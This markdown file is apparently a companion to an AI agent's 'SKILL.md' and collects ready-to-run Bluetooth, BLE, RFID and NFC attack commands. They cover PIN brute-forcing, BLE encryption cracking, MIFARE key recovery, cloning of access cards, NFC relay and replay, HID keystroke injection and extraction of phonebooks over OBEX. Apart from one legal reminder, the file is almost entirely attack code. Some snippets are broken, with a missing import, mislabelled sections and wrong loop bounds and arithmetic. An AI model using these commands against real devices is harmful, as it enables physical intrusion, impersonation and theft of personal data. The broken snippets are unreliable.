# Bluetooth, RFID & NFC Attack Payloads

> This file is a companion to `SKILL.md`, containing all Bluetooth/BLE/RFID/NFC attack commands and payloads, organized by attack type.

---

## 1. Bluetooth Reconnaissance

### 1.1 Active Bluetooth Device Discovery

```bash
# Standard Bluetooth inquiry scan (discoverable devices only)
hcitool scan

# Inquiry with extended response data (device class, clock offset)
hcitool inq

# Inquiry with timeout and flush parameters
hcitool inq --length=10 --flush

# Get detailed remote device information
hcitool info XX:XX:XX:XX:XX:XX

# Query device name
hcitool name XX:XX:XX:XX:XX:XX
```

### 1.2 Non-Discoverable Device Discovery (redfang)

```bash
# Scan a range of MAC addresses for non-discoverable devices
redfang -r 00:11:22:33:44:00 -s 00:11:22:33:44:FF

# Scan single OUI range (common for specific vendors)
redfang -r A4:83:E7:00:00:00 -s A4:83:E7:FF:FF:FF

# Scan full range with verbose output
redfang -r 00:00:00:00:00:00 -s FF:FF:FF:FF:FF:FF -v

# Scan with specific hci interface
redfang -i hci1 -r 00:1A:7D:DA:71:00 -s 00:1A:7D:DA:71:FF
```

### 1.3 Automated Logging with bluelog

```bash
# Basic Bluetooth scan with log output
bluelog -i hci0 -o /tmp/bluetooth_scan.log

# Continuous scanning with real-time logging
bluelog -i hci0 -o /tmp/bt_continuous.log -c

# Verbose output with device class information
bluelog -i hci0 -o /tmp/bt_verbose.log -v

# Daemon mode (background scanning)
bluelog -i hci0 -o /tmp/bt_daemon.log -d
```

### 1.4 Interactive Device Information (btscanner)

```bash
# Start interactive Bluetooth scanner
btscanner -i hci0

# Non-interactive mode: extract device info via hcitool
hcitool scan | tail -n +2 | while read mac name; do
  echo "=== $mac ($name) ==="
  hcitool info "$mac"
  sdptool browse "$mac"
done

# Browse SDP (Service Discovery Protocol) records
sdptool browse XX:XX:XX:XX:XX:XX

# Browse specific service class
sdptool browse --uuid 0x110A XX:XX:XX:XX:XX:XX
```

### 1.5 Continuous Monitoring with bluehydra

```bash
# Start continuous Bluetooth/BLE monitoring
sudo bluehydra -i hci0

# Run with data directory for persistent storage
sudo bluehydra -i hci0 -d /opt/bluehydra_data

# Enable BLE scanning alongside Classic
sudo bluehydra -i hci0 --ble

# Run with debug output
sudo bluehydra -i hci0 -d /tmp/bh_debug --debug
```

---

## 2. Bluetooth Device Exploitation

### 2.1 Device Identity Spoofing (spooftooph)

```bash
# Clone complete device identity (name + class + MAC)
spooftooph -i hci0 -a XX:XX:XX:XX:XX:XX -n "TargetPhone" -c 0x5a020c

# Spoof MAC address only
spooftooph -i hci0 -a XX:XX:XX:XX:XX:XX

# Spoof device name and class to impersonate a headset
spooftooph -i hci0 -n "Jabra Elite 75t" -c 0x240404

# Spoof to impersonate a specific phone model
spooftooph -i hci0 -a XX:XX:XX:XX:XX:XX -n "iPhone 15" -c 0x7a020c

# Randomize MAC address for anonymous scanning
spooftooph -i hci0 -r
```

### 2.2 Bluetooth Classic PIN Brute Force

```bash
# Capture pairing exchange for offline PIN analysis
# Requires Ubertooth hardware
ubertooth-rx -a XX:XX:XX:XX:XX:XX

# Attempt legacy PIN brute force via bluetoothctl script
for pin in $(seq -w 0000 9999); do
  echo -e "pair XX:XX:XX:XX:XX:XX\n$pin\n" | bluetoothctl 2>/dev/null | grep -q "Pairing successful" && {
    echo "[FOUND] PIN: $pin"
    break
  }
done

# Use Bettercap for Bluetooth enumeration and attacks
sudo bettercap -eval "net.recon on; net.show"
```

### 2.3 Bluetooth Sniffing with Ubertooth

```bash
# Capture all Bluetooth BR/EDR traffic
ubertooth-rx -f -c /tmp/bt_capture.pcap

# Follow a specific Bluetooth connection
ubertooth-rx -a XX:XX:XX:XX:XX:XX -c /tmp/bt_target.pcap

# Capture with timestamp and packet count display
ubertooth-rx -f -q -c /tmp/bt_full.pcap 2>&1 | tee /tmp/bt_log.txt

# Spectral analysis of 2.4 GHz band for Bluetooth activity
ubertooth-scan -t 30 -x

# Ubertooth firmware update and hardware check
ubertooth-util -v && ubertooth-util -f
```

---

## 3. BLE GATT Attacks

### 3.1 BLE Device Scanning

```bash
# Standard BLE device scan
sudo hcitool lescan

# BLE scan without duplicate filtering (see all advertisements)
sudo hcitool lescan --duplicates

# Scan with blescan (Python/BlueZ tool)
blescan -i hci0 -t 30 -o ble_devices.json

# Interactive BLE scanning with bluetoothctl
bluetoothctl << 'EOF'
power on
scan on
EOF

# Bettercap BLE reconnaissance
sudo bettercap -eval "ble.recon on; ble.show"
```

### 3.2 GATT Service Enumeration (gatttool)

```bash
# Discover all primary GATT services
gatttool -b XX:XX:XX:XX:XX:XX --primary

# List all characteristics across all services
gatttool -b XX:XX:XX:XX:XX:XX --characteristics

# List all characteristic descriptors
gatttool -b XX:XX:XX:XX:XX:XX --char-desc

# Read a specific characteristic by handle
gatttool -b XX:XX:XX:XX:XX:XX --char-read -a 0x0025

# Read a characteristic by UUID
gatttool -b XX:XX:XX:XX:XX:XX --char-read -u 00002a00-0000-1000-8000-00805f9b34fb

# Read long characteristic value (multi-part)
gatttool -b XX:XX:XX:XX:XX:XX --char-read -a 0x0025 --handle-read-long
```

### 3.3 GATT Characteristic Write Exploitation

```bash
# Write value to a characteristic (command injection)
gatttool -b XX:XX:XX:XX:XX:XX --char-write-req -a 0x0025 -n 0100

# Write without response (fire and forget)
gatttool -b XX:XX:XX:XX:XX:XX --char-write-cmd -a 0x0025 -n 0001FF

# Interactive GATT session for multi-step exploitation
gatttool -b XX:XX:XX:XX:XX:XX -I << 'CMDS'
connect
primary
characteristics
char-read-hnd 0x0003
char-read-hnd 0x0025
char-write-req 0x0025 0100
char-read-hnd 0x0025
quit
CMDS

# Enumerate and dump all readable characteristics
for handle in $(seq 1 255); do
  result=$(gatttool -b XX:XX:XX:XX:XX:XX --char-read -a "0x$(printf '%04x' $handle)" 2>/dev/null)
  echo "Handle 0x$(printf '%04x' $handle): $result"
done
```

### 3.4 BLE Encryption Cracking (crackle)

```bash
# Crack BLE Legacy Pairing from captured pcap
crackle -i ble_pairing.pcap -o ble_decrypted.pcap

# Crack with specific Temporary Key (if known)
crackle -i ble_pairing.pcap -o ble_decrypted.pcap -t 00000000

# Analyze captured BLE traffic in Wireshark
wireshark ble_decrypted.pcap &

# Extract BLE pairing data from Ubertooth capture
ubertooth-btle -f -c /tmp/ble_raw.pcap
crackle -i /tmp/ble_raw.pcap -o /tmp/ble_cracked.pcap
```

### 3.5 BLE Sniffing with Ubertooth

```bash
# BLE promiscuous sniffing (capture all advertisements + connections)
ubertooth-btle -f -c /tmp/ble_all.pcap

# Follow specific BLE connection by master address
ubertooth-btle -t XX:XX:XX:XX:XX:XX -c /tmp/ble_follow.pcap

# Capture BLE connection with access address
ubertooth-btle -a 0x8E89BED6 -c /tmp/ble_conn.pcap

# Continuous BLE advertisement capture
ubertooth-btle -f -r 60 -c /tmp/ble_60s.pcap

# Real-time BLE packet decoding (no pcap)
ubertooth-btle -f -n
```

---

## 4. RFID/NFC Card Operations

### 4.1 NFC Device and Card Detection

```bash
# List all connected NFC devices
nfc-list

# Scan for NFC tags in range
nfc-scan-device -v

# Poll for ISO 14443-A tags
nfc-poll

# Read tag UID only
nfc-list -v 2>&1 | grep "UID"

# Detect card type with proxmark3
proxmark3-client -c "hf search"
```

### 4.2 MIFARE Classic Key Recovery (mfoc)

```bash
# Standard MIFARE Classic key recovery (nested attack)
# Requires at least one known key (default: 0xA0A1A2A3A4A5)
mfoc -P 500 -O card_dump.mfd

# Specify known key explicitly
mfoc -P 500 -O card_dump.mfd -k A0A1A2A3A4A5

# Use multiple known keys
mfoc -P 500 -O card_dump.mfd -k A0A1A2A3A4A5 -k FFFFFFFFFFFF -k 000000000000

# Set probe count for faster recovery (less reliable)
mfoc -P 100 -O card_dump_fast.mfd

# Dump card with recovered keys and save key file
mfoc -P 500 -O card_dump.mfd -D card_keys.mfd
```

### 4.3 MIFARE Classic Darkside Attack (mfcuk)

```bash
# Basic darkside attack (for cards with only one known key)
mfcuk -C -R 0:A -s 250 -S 5 -v 3

# Darkside attack targeting specific sector
mfcuk -C -R 5:A -s 500 -S 10 -v 3

# With known key hint to speed up recovery
mfcuk -C -R 0:A -s 250 -S 5 -v 3 -k A0A1A2A3A4A5

# Verbose output for debugging
mfcuk -C -R 0:A -s 100 -S 3 -v 5
```

### 4.4 Proxmark3 RFID Operations

```bash
# Detect and identify card type
proxmark3-client -c "hf search"

# Read MIFARE Classic card information
proxmark3-client -c "hf mf info"

# Dump all sectors of MIFARE Classic card
proxmark3-client -c "hf mf dump"

# Dump specific sector
proxmark3-client -c "hf mf rdsc --sn 0 --kt A --key FFFFFFFFFFFF"

# Read specific block
proxmark3-client -c "hf mf rdbl --blk 0 --kt A --key A0A1A2A3A4A5"

# Write to specific block
proxmark3-client -c "hf mf wrbl --blk 4 --kt A --key A0A1A2A3A4A5 -d 01020304050607080910111213141516"

# Clone MIFARE Classic card to blank card
proxmark3-client -c "hf mf clone --uid TARGET_UID"

# Load dump file and emulate card
proxmark3-client -c "hf mf sim --uid TARGET_UID -i dump.bin"

# Check for default keys across all sectors
proxmark3-client -c "hf mf chk --1k -d /tmp/default_keys.txt"
```

### 4.5 NFC Tag Reading and Writing (libnfc)

```bash
# Read MIFARE Classic card to file
nfc-mfclassic r a card_dump.mfd /dev/ttyUSB0

# Write dump to blank card
nfc-mfclassic w a card_dump.mfd /dev/ttyUSB0

# Full format read (include access bits and sector trailers)
nfc-mfclassic r a card_full.mfd /dev/ttyUSB0 f

# Read MIFARE Ultralight card
nfc-mfurl r ultra_dump.mfd

# Write NDEF URL to NFC tag
nfc-mfurl w "https://security-test.example.com"

# Check write protection status
nfc-mfsetuid -h
```

---

## 5. NFC Tag Operations

### 5.1 NFC NDEF Tag Manipulation

```bash
# Read NDEF records from NFC tag with proxmark3
proxmark3-client -c "hf mf ndefread"

# Write NDEF URL record to MIFARE tag
proxmark3-client -c "hf mf ndefwrite -t \"https://security-test.example.com\""

# Read MIFARE Ultralight with proxmark3
proxmark3-client -c "hf mfu read"

# Dump MIFARE Ultralight content
proxmark3-client -c "hf mfu dump"

# Write to MIFARE Ultralight page
proxmark3-client -c "hf mfu write -p 4 -d 01020304"

# Format MIFARE tag as NDEF
proxmark3-client -c "hf mf format"
```

### 5.2 NFC Relay and Emulation

```bash
# Emulate MIFARE Classic card with proxmark3
proxmark3-client -c "hf mf sim --uid A1B2C3D4 -i card_dump.bin"

# Emulate MIFARE Ultralight
proxmark3-client -c "hf mfu sim -t 7 -i"

# Simulate ISO 14443-A tag with custom UID
proxmark3-client -c "hf 14a sim -t 1 -u A1B2C3D4"

# NFC relay between two proxmark3 devices
# Device 1 (reader side):
proxmark3-client -c "hf 14a relay --mode reader"
# Device 2 (card side):
proxmark3-client -c "hf 14a relay --mode card"

# Sniff ISO 14443-A communication between reader and card
proxmark3-client -c "hf 14a sniff"
```

### 5.3 Advanced RFID Operations

```bash
# Enumerate all supported card types
proxmark3-client -c "hf search"

# MIFARE DESFire operations
proxmark3-client -c "hf mfdes info"
proxmark3-client -c "hf mfdes enum"

# ISO 15693 (long-range RFID) operations
proxmark3-client -c "hf 15 search"
proxmark3-client -c "hf 15 read --uid E001020304050607 --block 0"

# HID iCLASS operations
proxmark3-client -c "hf iclass info"
proxmark3-client -c "hf iclass read --csn"

# Legic Prime operations
proxmark3-client -c "hf legic info"
proxmark3-client -c "hf legic dump"
```

### 5.4 Bulk RFID Operations and Scripting

```bash
# Batch dump multiple cards with shell script
for i in $(seq 1 20); do
  echo "Present card $i and press Enter..."
  read _
  proxmark3-client -c "hf mf dump" 2>/dev/null
  mv /tmp/dump.bin "/tmp/card_${i}.bin"
  echo "Card $i dumped."
done

# Automated MIFARE key check across common defaults
proxmark3-client -c "hf mf chk --1k -d /usr/share/proxmark3/defaults.bin" 2>/dev/null | grep -i "found"

# Convert MIFARE dump to human-readable format
python3 -c "
import sys
data = open(sys.argv[1], 'rb').read()
for sector in range(16):
    print(f'--- Sector {sector} ---')
    for block in range(4):
        offset = sector * 64 + block * 16
        chunk = data[offset:offset+16]
        hex_str = ' '.join(f'{b:02x}' for b in chunk)
        ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        print(f'  Block {block * 4 + sector * 4:2d}: {hex_str} | {ascii_str}')
" card_dump.mfd
```

---

---

## 6. BLE GATT Service Attacks

### 6.1 Heart Rate Monitor Data Interception

```bash
# Discover heart rate service (UUID 0x180D)
gatttool -b XX:XX:XX:XX:XX:XX --characteristics | grep "180D"

# Subscribe to heart rate measurement notifications
gatttool -b XX:XX:XX:XX:XX:XX --char-write-req -a 0x0025 -n 0100 --listen

# Read body sensor location characteristic
gatttool -b XX:XX:XX:XX:XX:XX --char-read -u 00002a38-0000-1000-8000-00805f9b34fb
```

### 6.2 HID Device Injection via BLE

```bash
# Enumerate HID service (UUID 0x1812)
gatttool -b XX:XX:XX:XX:XX:XX --primary | grep "1812"

# Read HID report map descriptor
gatttool -b XX:XX:XX:XX:XX:XX --char-read -u 00002a4b-0000-1000-8000-00805f9b34fb

# Write to HID control point to simulate key press
gatttool -b XX:XX:XX:XX:XX:XX --char-write-req -a 0x0038 -n 0100

# Write report to boot keyboard input characteristic
gatttool -b XX:XX:XX:XX:XX:XX --char-write-cmd -a 0x0035 -n 0000040000000000
```

### 6.3 Battery Level and Device Info Enumeration

```bash
# Read battery level (UUID 0x2A19)
gatttool -b XX:XX:XX:XX:XX:XX --char-read -u 00002a19-0000-1000-8000-00805f9b34fb

# Read device name (UUID 0x2A00)
gatttool -b XX:XX:XX:XX:XX:XX --char-read -u 00002a00-0000-1000-8000-00805f9b34fb

# Read firmware revision string (UUID 0x2A26)
gatttool -b XX:XX:XX:XX:XX:XX --char-read -u 00002a26-0000-1000-8000-00805f9b34fb

# Read manufacturer name (UUID 0x2A29)
gatttool -b XX:XX:XX:XX:XX:XX --char-read -u 00002a29-0000-1000-8000-00805f9b34fb
```

---

## 7. RFID Card Cloning Techniques

### 7.1 MIFARE Classic Gen1UID Clone (Full Block Write)

```bash
# Dump original card to binary file
proxmark3-client -c "hf mf dump"
mv /tmp/dump.bin /tmp/original_card.bin

# Write dump to Gen1UID writable card block by block
for block in $(seq 0 63); do
  offset=$((block * 16))
  data=$(xxd -s $offset -l 16 -p /tmp/original_card.bin)
  proxmark3-client -c "hf mf wrbl --blk $block --kt A --key FFFFFFFFFFFF -d $data"
done

# Verify clone matches original
proxmark3-client -c "hf mf dump"
md5sum /tmp/dump.bin /tmp/original_card.bin
```

### 7.2 MIFARE Gen2 (Magic Card) Clone with UID Change

```bash
# Write block 0 with target UID on Gen2 magic card
proxmark3-client -c "hf mf wrbl --blk 0 --kt A --key FFFFFFFFFFFF -d A1B2C3D4080400630000000000000011"

# Verify new UID is written
proxmark3-client -c "hf mf info"

# Write remaining blocks from dump
proxmark3-client -c "hf mf restore --source /tmp/original_card.bin"
```

### 7.3 HID iCLASS Card Operations

```bash
# Read HID iCLASS card information
proxmark3-client -c "hf iclass info"

# Dump iCLASS card data
proxmark3-client -c "hf iclass dump --ki 0"

# Simulate iCLASS card
proxmark3-client -c "hf iclass sim --csn A1B2C3D4E5F60708"

# Check for default iCLASS keys
proxmark3-client -c "hf iclass chk -f /usr/share/proxmark3/iclass_default_keys.txt"
```

---

## 8. NFC Relay and Emulation Attacks

### 8.1 NFC Relay Setup with Two Proxmark3 Devices

```bash
# Device 1 (reader side, placed near legitimate reader)
proxmark3-client -c "hf 14a relay --mode reader"

# Device 2 (card side, placed near target card)
proxmark3-client -c "hf 14a relay --mode card"

# The relay forwards all reader commands to the card and responses back
# This effectively extends the range of the card-reader transaction
```

### 8.2 NFC Sniffing and Protocol Analysis

```bash
# Sniff ISO 14443-A communication between reader and card
proxmark3-client -c "hf 14a sniff"

# Convert sniffed data to PCAP for Wireshark analysis
# After sniffing, extract data from proxmark3 trace buffer
proxmark3-client -c "data histrace"

# Sniff ISO 14443-B communication
proxmark3-client -c "hf 14b sniff"
```

### 8.3 NFC Tag Spoofing and Replay

```bash
# Capture tag data from sniffed communication
proxmark3-client -c "hf 14a sniff"
# Wait for a legitimate transaction, then stop sniffing

# Extract UID and other parameters
proxmark3-client -c "hf list 14a"

# Simulate the captured tag with the same UID
proxmark3-client -c "hf 14a sim -t 1 -u A1B2C3D4"

# For MIFARE Classic: simulate with full key set
proxmark3-client -c "hf mf sim --uid A1B2C3D4 -i /tmp/card_dump.bin"
```

---

## 9. Bluetooth Sniffing and Protocol Analysis

### 9.1 Comprehensive Bluetooth Traffic Capture

```bash
# Capture all Bluetooth BR/EDR traffic to PCAP
ubertooth-rx -f -c /tmp/bt_all_traffic.pcap

# Follow specific device connection
ubertooth-rx -a XX:XX:XX:XX:XX:XX -c /tmp/bt_target_device.pcap

# Capture with Libpcap format for direct Wireshark analysis
ubertooth-rx -f -c - | wireshark -k -i -

# Monitor Bluetooth LE advertisements only
ubertooth-btle -f -n -c /tmp/ble_advertisements.pcap
```

### 9.2 Bluetooth Protocol Dissection

```bash
# Analyze captured Bluetooth traffic in Wireshark
wireshark /tmp/bt_all_traffic.pcap &

# Filter for Bluetooth L2CAP in tshark
tshark -r /tmp/bt_all_traffic.pcap -Y "btatt" -T fields -e btatt.handle -e btatt.value

# Extract BLE GATT operations from capture
tshark -r /tmp/ble_capture.pcap -Y "btle" -T fields -e btle.advertising_address -e btle.length

# Decode captured Bluetooth HCI commands
tshark -r /tmp/bt_capture.pcap -Y "bthci_cmd" -T fields -e bthci_cmd.opcode -e bthci_cmd.param
```

### 9.3 Bluetooth Classic Connection Hijacking

```bash
# Detect active Bluetooth connections
hcitool con

# Monitor for reconnection attempts from paired devices
# Set up listener with spooftooph for auto-connection capture
spooftooph -i hci0 -a TARGET_MAC -n "TargetDevice" -c 0x7a020c &

# Capture L2CAP signaling during connection establishment
ubertooth-rx -a TARGET_MAC -c /tmp/l2cap_capture.pcap
tshark -r /tmp/l2cap_capture.pcap -Y "btl2cap" -T fields -e btl2cap.psm -e btl2cap.length
```

### 9.4 Bluetooth Service Vulnerability Testing

```bash
# Test OBEX Object Push service for unauthorized file transfer
obexftp -b TARGET_MAC -c / -l

# Test OBEX Phone Book Access for contact data extraction
obexftp -b TARGET_MAC -c /telecom/pb.vcf -g pb.vcf

# Browse available OBEX services
sdptool browse TARGET_MAC | grep -A5 "OBEX"

# Test for Bluetooth serial port (SPP) access
rfcomm connect rfcomm0 TARGET_MAC 1
cat /dev/rfcomm0
```

---

## 10. BLE Security Assessment Tools

### Bettercap BLE Reconnaissance

```bash
# Start Bettercap BLE scanning
sudo bettercap -eval "ble.recon on; ble.show"

# Enumerate specific BLE device services
sudo bettercap -eval "ble.enum TARGET_MAC"

# Read a BLE characteristic via Bettercap
sudo bettercap -eval "ble.read TARGET_MAC HANDLE"

# Write to a BLE characteristic via Bettercap
sudo bettercap -eval "ble.write TARGET_MAC HANDLE HEX_VALUE"
```

### BLEAdvertising and Spoofing

```bash
# BLE advertisement spoofing with Bettercap
sudo bettercap -eval "
  set ble.recon.enable true
  ble.recon on
  set ble.inject.enabled true
  ble.inject on
"

# Capture BLE advertisements for analysis
sudo hcitool lescan --duplicates | while read addr name; do
  echo "$(date +%s) $addr $name"
done > /tmp/ble_ad_log.txt
```

### MIFARE DESFire Operations

```bash
# MIFARE DESFire card detection and info
proxmark3-client -c "hf mfdes info"
proxmark3-client -c "hf mfdes enum"

# DESFire application listing
proxmark3-client -c "hf mfdes listapps"

# Read DESFire file
proxmark3-client -c "hf mfdes read --aid 0x000001 --fid 0x01"
```

### NFC Tag Cloning Verification

```bash
# Verify cloned card matches original using proxmark3
# Dump original card
proxmark3-client -c "hf mf dump" 2>/dev/null
md5sum /tmp/dump.bin > /tmp/original.md5

# Dump cloned card
proxmark3-client -c "hf mf dump" 2>/dev/null
md5sum /tmp/dump.bin > /tmp/cloned.md5

# Compare dumps
diff /tmp/original.md5 /tmp/cloned.md5 && echo "MATCH" || echo "MISMATCH"
```

### Bluetooth Keyboard/Mouse Injection Testing

```bash
# Test for KNOB (Key Negotiation of Bluetooth) attack vulnerability
# Check if device accepts low entropy encryption key
hcitool info TARGET_MAC
# If device uses BT 4.2+, verify entropy is 16 bytes, not 1

# Test for BIAS (Bluetooth Impersonation AttackS) vulnerability
# Attempt connection without proper authentication
hcitool cc TARGET_MAC 2>&1 | grep -i "error\|refused\|success"
```

---

## 11. NFC Tag Security Assessment Automation

### Automated NFC Tag Audit Script

```bash
#!/bin/bash
# NFC tag security audit automation
echo "=== NFC Tag Security Audit ==="
echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)"

echo "[1] Detecting card type..."
proxmark3-client -c "hf search" 2>/dev/null | tee /tmp/nfc_card_type.txt

echo "[2] Checking for default keys..."
proxmark3-client -c "hf mf chk --1k -d /tmp/default_keys.txt" 2>/dev/null | tee /tmp/nfc_key_check.txt

echo "[3] Attempting key recovery (MFOC)..."
mfoc -P 500 -O /tmp/nfc_card_dump.mfd 2>/dev/null
[ -f /tmp/nfc_card_dump.mfd ] && echo "DUMP SUCCESSFUL" || echo "DUMP FAILED"

echo "[4] Analyzing dump for sensitive data..."
strings /tmp/nfc_card_dump.mfd 2>/dev/null | head -20

echo "[5] Checking UID changeability..."
proxmark3-client -c "hf mf info" 2>/dev/null | grep -i "uid\|magic\|gen"
```

### BLE GATT Automated Scanner

```python
#!/usr/bin/env python3
"""Automated BLE GATT service and characteristic scanner."""
import subprocess
import sys

TARGET_MAC = sys.argv[1]

def run_cmd(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout

print(f"Scanning BLE device: {TARGET_MAC}")
print("Services:")
services = run_cmd(f"gatttool -b {TARGET_MAC} --primary")
print(services)

print("\nCharacteristics:")
chars = run_cmd(f"gatttool -b {TARGET_MAC} --characteristics")
print(chars)

# Attempt to read all handles from 0x0001 to 0xFFFF
print("\nBrute-forcing readable handles:")
for handle in range(1, 256):
    result = run_cmd(f"gatttool -b {TARGET_MAC} --char-read -a 0x{handle:04x} 2>/dev/null")
    if "Error" not in result and "invalid" not in result.lower() and result.strip():
        print(f"  Handle 0x{handle:04x}: {result.strip()}")
```

---

## 12. Bluetooth Security Audit Report Generation

### Automated Bluetooth Security Audit

```bash
#!/bin/bash
# Automated Bluetooth security audit report generator
REPORT="/tmp/bt_audit_$(date +%Y%m%d_%H%M%S).txt"

echo "=== Bluetooth Security Audit ===" | tee "$REPORT"
echo "Date: $(date -u +%Y-%m-%dT%H:%M:%SZ)" | tee -a "$REPORT"

echo "[1] Discoverable Devices" | tee -a "$REPORT"
hcitool scan | tee -a "$REPORT"

echo "[2] Device Information" | tee -a "$REPORT"
hcitool scan | tail -n +2 | while read mac name; do
  echo "Device: $name ($mac)" | tee -a "$REPORT"
  hcitool info "$mac" 2>/dev/null | tee -a "$REPORT"
  sdptool browse "$mac" 2>/dev/null | tee -a "$REPORT"
done

echo "[3] BLE Devices" | tee -a "$REPORT"
hcitool lescan --duplicates 2>/dev/null | head -20 | tee -a "$REPORT"
```

### RFID Card Audit Report

```bash
# Generate RFID card audit report
echo "=== RFID Card Audit Report ==="
echo "Card Type: $(proxmark3-client -c 'hf search' 2>/dev/null | grep -i 'type')"
echo "UID: $(proxmark3-client -c 'hf mf info' 2>/dev/null | grep -i 'uid')"
echo "Default Keys: $(proxmark3-client -c 'hf mf chk --1k' 2>/dev/null | grep -c 'found')"
echo "Dump Status: $([ -f /tmp/dump.bin ] && echo 'SUCCESS' || echo 'FAILED')"
```

### Bluetooth PIN Cracking from Captured Pairing

```bash
# Capture Bluetooth pairing exchange and crack PIN offline
# Requires captured pairing pcap from Ubertooth
crackle -i bt_pairing.pcap -o bt_decoded.pcap 2>&1 | tee crack_results.txt

# If PIN is short, brute force with custom wordlist
for pin in $(seq -w 0000 9999); do
  crackle -i bt_pairing.pcap -t "$pin" 2>/dev/null && echo "PIN FOUND: $pin" && break
done
```

### Bluetooth Device Tracking Detection

```bash
# Monitor for Bluetooth tracking devices (AirTag, Tile, etc.)
# Scan for nearby Bluetooth LE devices and check for tracking signatures
hcitool lescan --duplicates 2>/dev/null | while read addr name; do
  echo "$(date +%s) $addr $name"
done | tee /tmp/bt_tracking_log.txt

# Check for Apple AirTag using specific service UUID
gatttool -b TARGET_MAC --primary 2>/dev/null | grep -i "apple\|airtag\|0xFD6A"
```

---

> **Legal Reminder**: All commands are restricted to authorized testing environments only. See `SKILL.md` for legal statement.

### BLE Advertisement Analysis

```bash
# Decode BLE advertisement data
python3 -c "
import struct
data = bytes.fromhex(sys.argv[1])
print(f\"Length: {data[0]}, Type: {data[1]:#x}, Data: {data[2:].hex()}\")
" 020106 2>/dev/null || echo "Usage: script.py <hex_ad_payload>"
```

### Bluetooth Audio Sniffing

```bash
# Capture Bluetooth A2DP audio stream
hcitool scan | while read mac name; do
  echo "Device: $name ($mac)"
done
```

### NFC Tag Type Detection

```bash
# Detect NFC tag type and memory size
proxmark3-client -c "hf search" 2>/dev/null | grep -iE "type|size|ATQA|SAK"
```

### BLE GATT Characteristic Brute Force

```bash
# Enumerate all GATT characteristics with brute-force handle scan
gatttool -b AA:BB:CC:DD:EE:FF --char-desc | grep -E 'handle: (0x[0-9a-f]+)'
for handle in $(seq 0x0001 0xFFFF); do
  gatttool -b AA:BB:CC:DD:EE:FF --char-read -a "$handle" 2>/dev/null && echo "Handle $handle: readable"
done
```

### Bluetooth Device Fingerprinting

```bash
# Fingerprint Bluetooth device class and services
hcitool info AA:BB:CC:DD:EE:FF
sdptool browse AA:BB:CC:DD:EE:FF
btmgmt info AA:BB:CC:DD:EE:FF 2>/dev/null
```
